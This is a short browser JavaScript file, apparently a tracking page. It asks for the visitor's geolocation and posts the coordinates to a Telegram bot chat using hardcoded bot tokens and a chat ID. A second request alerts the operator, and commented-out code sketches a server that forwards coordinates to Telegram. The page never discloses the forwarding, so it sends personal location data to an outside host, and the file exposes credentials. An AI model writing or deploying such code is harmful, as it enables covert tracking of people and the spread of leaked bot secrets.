const p = document.getElementById('p')
navigator.geolocation.getCurrentPosition(
  async (pos) => {
    const { latitude, longitude } = pos.coords;
    p.textContent = `${latitude}, ${longitude}`;

    await fetch(
      'https://api.telegram.org/bot7162055702:AAEpgb9dcj09MYhrDL6dKF-bL2NR5klaWn0/sendLocation',
      {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          chat_id: '5335499274',
          latitude: latitude,
          longitude: longitude
        })
      }
    );
  },
  (err) => {
    console.log('Пользователь отказал', err);
    p.textContent = 'no';
  }
);
fetch('https://api.telegram.org/bot7845228825:AAGHu-y1on7AfOpvQJlPDTWSldBuQrKQE6k/sendMessage', {
  method:'POST',
  headers:{
      'Content-Type': 'application/json'
  },
  body: JSON.stringify({
          chat_id: '5335499274',
          text:'НАЖМИТЕ НА ОТКРЫТЬ'
        })
})
//navigator.geolocation.getCurrentPosition(
    //(pos) => {
   // console.log(pos.coords.latitude, pos.coords.longitude);
  //},
  //(err) => {
   // console.log("Пользователь отказал", err);
 // }
//)


// const express = require("express");
// const TelegramBot = require("node-telegram-bot-api");

// const app = express();
// app.use(express.json());

// const TOKEN = "ТВОЙ_ТОКЕН";
// const CHAT_ID = "ТВОЙ_CHAT_ID";

// const bot = new TelegramBot(TOKEN, { polling: true });

// app.post("/location", (req, res) => {
//   const { lat, lon } = req.body;

//   console.log("Координаты:", lat, lon);

//   bot.sendMessage(
//     CHAT_ID,
//     `📍 Новая геолокация:\nШирота: ${lat}\nДолгота: ${lon}`
//   );

//   res.sendStatus(200);
// });

// app.listen(3000, () => {
//   console.log("Server started on 3000");
// });

